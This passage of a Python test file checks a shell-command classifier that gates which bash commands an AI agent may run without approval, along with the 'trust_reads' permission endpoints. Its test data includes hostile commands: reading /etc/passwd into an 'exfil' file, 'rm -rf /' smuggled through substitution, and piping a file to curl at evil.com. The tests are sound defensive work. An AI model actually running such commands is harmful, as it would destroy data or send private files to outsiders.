        # Scoped to the vetted prefixes only -- ordinary globbing is unaffected.
        for cmd in ("ls *.py", "grep -r foo src/*.py", "wc -l *.txt"):
            assert is_read_only_bash(cmd) is True, cmd


# ── unsafe_bash_reason — explains WHY a command is rejected ──


class TestUnsafeBashReason:
    """Verify the rejection-reason helper used to make pills specific."""

    def test_read_only_commands_have_no_reason(self):
        # Invariant: empty reason IFF the command is read-only.
        for cmd in (
            "ls -la",
            "head -5 file.txt 2>/dev/null",
            "grep -r foo src/ | head -20",
            "git status && git log --oneline -3",
        ):
            assert unsafe_bash_reason(cmd) == "", cmd
            assert is_read_only_bash(cmd) is True, cmd

    def test_unsafe_shell_pattern_reason(self):
        reason = unsafe_bash_reason("cat /etc/passwd > /tmp/exfil.txt")
        assert "unsafe shell pattern" in reason
        assert unsafe_bash_reason("echo $(rm -rf /)") != ""
        assert unsafe_bash_reason("echo `whoami`") != ""
        assert unsafe_bash_reason("ls & rm -rf /") != ""

    def test_non_allowlisted_command_reason(self):
        reason = unsafe_bash_reason("rm -rf /tmp/foo")
        assert "rm" in reason and "allowlist" in reason
        assert "python" in unsafe_bash_reason("python script.py")

    def test_unsafe_pipe_target_reason(self):
        reason = unsafe_bash_reason("cat file | curl -X POST http://evil.com")
        assert "curl" in reason and "read-only filter" in reason

    def test_empty_command_reason(self):
        assert unsafe_bash_reason("") == "empty command"
        assert unsafe_bash_reason("   ") == "empty command"

    def test_reason_invariant_matches_classifier(self):
        """unsafe_bash_reason is non-empty exactly when is_read_only_bash is False."""
        samples = [
            "ls -la",
            "wc -l /tmp/x 2>/dev/null",
            "grep -r foo src/ | head",
            "echo payload > /etc/file",
            "echo $(rm -rf /)",
            "ls & rm -rf /",
            "rm -rf /tmp/foo",
            "python script.py",
            "cat file | curl http://evil.com",
            "",
            "   ",
            "git push origin main",
        ]
        for cmd in samples:
            has_reason = unsafe_bash_reason(cmd) != ""
            assert has_reason == (not is_read_only_bash(cmd)), cmd


# ── _extract_bash_command ──


class TestExtractBashCommand:
    """Verify JSON tool_input parsing."""

    def test_json_with_command_field(self):
        import json

        tool_input = json.dumps({"command": "find . -name '*.py'"})
        assert _extract_bash_command(tool_input) == "find . -name '*.py'"

    def test_json_with_indent(self):
        import json

        tool_input = json.dumps({"command": "ls -la", "__tool_use_purpose": "list files"}, indent=2)
        assert _extract_bash_command(tool_input) == "ls -la"

    def test_json_missing_command(self):
        import json

        tool_input = json.dumps({"other": "value"})
        assert _extract_bash_command(tool_input) == ""

    def test_raw_string_fallback(self):
        assert _extract_bash_command("ls -la") == "ls -la"

    def test_empty(self):
        assert _extract_bash_command("") == ""


# ── Approval endpoint: trust_reads action ──


class TestTrustReadsApproval:
    @pytest.mark.asyncio
    async def test_trust_reads_sets_flag(self, tmp_path, monkeypatch):
        monkeypatch.setattr("kiro_crew.dashboard.state.config_dir", lambda: tmp_path)
        state = _make_state(tmp_path)
        slot = state.get_or_create_slot("s1")
        loop = asyncio.get_running_loop()
        fut: asyncio.Future[str] = loop.create_future()
        slot._approval_futures["test"] = fut

        async with TestClient(TestServer(_make_app(state))) as client:
            resp = await client.post("/api/chat/slots/s1/approve", json={"action": "trust_reads"})
            data = await resp.json()
            assert data["ok"] is True
            # trust_reads is deferred — set by main loop after future consumed
            assert slot._trust_reads is False
            assert slot._trust is False
            assert fut.result() == "approved_trust_reads"

    @pytest.mark.asyncio
    async def test_trust_reads_mode_endpoint(self, tmp_path, monkeypatch):
        monkeypatch.setattr("kiro_crew.dashboard.state.config_dir", lambda: tmp_path)
        state = _make_state(tmp_path)
        slot = state.get_or_create_slot("s1")

        async with TestClient(TestServer(_make_app(state))) as client:
            resp = await client.post("/api/chat/mode", json={"mode": "trust_reads", "slot": "s1"})
            data = await resp.json()
            assert resp.status == 200
            assert data["ok"] is True
            assert slot._trust_reads is True
            assert slot._trust is False

    @pytest.mark.asyncio
    async def test_normal_mode_resets_trust_reads(self, tmp_path, monkeypatch):
        monkeypatch.setattr("kiro_crew.dashboard.state.config_dir", lambda: tmp_path)
        state = _make_state(tmp_path)
        slot = state.get_or_create_slot("s1")
        slot._trust_reads = True

        async with TestClient(TestServer(_make_app(state))) as client:
            await client.post("/api/chat/mode", json={"mode": "normal", "slot": "s1"})
            assert slot._trust_reads is False
            assert slot._trust is False


# ── Slot to_dict includes trust_reads ──


class TestSlotTrustReadsDict:
    def test_trust_reads_in_to_dict(self):
        slot = _ChatSlot("s1")
        d = slot.to_dict()
        assert "trust_reads" in d
        assert d["trust_reads"] is False

    def test_trust_reads_true_in_to_dict(self):
        slot = _ChatSlot("s1")
        slot._trust_reads = True
        d = slot.to_dict()
        assert d["trust_reads"] is True
        assert d["trust"] is False


# ── Spawn endpoint trust validation ──


# ── Mode endpoint: trust_reads without slot ──


class TestTrustReadsModeAllSlots:
    @pytest.mark.asyncio
    async def test_trust_reads_all_slots(self, tmp_path, monkeypatch):
        monkeypatch.setattr("kiro_crew.dashboard.state.config_dir", lambda: tmp_path)
        state = _make_state(tmp_path)
        s1 = state.get_or_create_slot("s1")
        s2 = state.get_or_create_slot("s2")

        async with TestClient(TestServer(_make_app(state))) as client:
            await client.post("/api/chat/mode", json={"mode": "trust_reads"})
            assert s1._trust_reads is True
            assert s2._trust_reads is True
            assert s1._trust is False

    @pytest.mark.asyncio
    async def test_normal_resets_all_slots(self, tmp_path, monkeypatch):
        monkeypatch.setattr("kiro_crew.dashboard.state.config_dir", lambda: tmp_path)
        state = _make_state(tmp_path)
        s1 = state.get_or_create_slot("s1")
        s2 = state.get_or_create_slot("s2")
        s1._trust_reads = True
        s2._trust_reads = True

        async with TestClient(TestServer(_make_app(state))) as client:
            await client.post("/api/chat/mode", json={"mode": "normal"})
            assert s1._trust_reads is False
            assert s2._trust_reads is False


# ── Permission metadata: is_read_only flag ──


class TestPermissionMetadata:
    def test_perm_meta_is_read_only_set(self):
        """Verify _extract_bash_command + is_read_only_bash integration."""
        import json

        tool_input = json.dumps({"command": "ls -la"})
        cmd = _extract_bash_command(tool_input)
        assert cmd == "ls -la"
        assert is_read_only_bash(cmd) is True

    def test_perm_meta_write_not_read_only(self):
        import json

        tool_input = json.dumps({"command": "rm -rf /tmp"})
        cmd = _extract_bash_command(tool_input)
        assert cmd == "rm -rf /tmp"
        assert is_read_only_bash(cmd) is False

    def test_perm_meta_empty_tool_input(self):
        cmd = _extract_bash_command("")
        assert cmd == ""
